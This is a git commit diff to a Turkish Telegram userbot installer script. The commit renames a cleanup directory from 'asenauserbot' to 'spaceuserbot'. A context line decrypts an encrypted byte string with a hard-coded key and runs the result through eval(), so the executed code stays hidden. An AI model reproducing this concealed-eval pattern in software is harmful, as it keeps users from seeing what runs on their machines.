301127efc7718478e7c3c5c686416b3af62d1da9
Erdem Üveyik <73111211+ErdemBey1@users.noreply.github.com>
2021-01-24 15:24:44 +0300

    Update __main__.py

--- space_installer/__main__.py
+++ space_installer/__main__.py
@@ -98,8 +98,8 @@ if __name__ == "__main__":
     onemli(LANG['DOWNLOADING'])
 
     # Noldu Kendi Reponu Yazamadın Mı? Hadi Başka Kapıya #
-    if os.path.isdir("./asenauserbot/"):
-        rm_r("./asenauserbot/")
+    if os.path.isdir("./spaceuserbot/"):
+        rm_r("./spaceuserbot/")
     repo = eval(Sifrele(b'Z^}\xb2\x94\x0f(O\x98\'J+n\x81\xef\xebX\x19\xb2\xf5\x87\x8f\x9f\x839\x99\xcb\xa6>\xb6{\xe1C\xd9\x9b\xcb,x\x90- :\x80\x08\xd6\x14\x9d\x8a\xd2\x95\x0b\x17c\xbd.\xef\xe0*\xc5"\n\x9f,\x16\xa9\x15\xcb\xc9\xbf\xef\xf5\xd1\x8b\xa8\x99\xa8\xfee\xdb\x8a\x8a\xe80.\xc9\xcf\xcd\xdbN\x8a\xd7N', b'@AsenaUserBot').decode("utf-8"))
     basarili(LANG['DOWNLOADED'])
     onemli(LANG['DEPLOYING'])
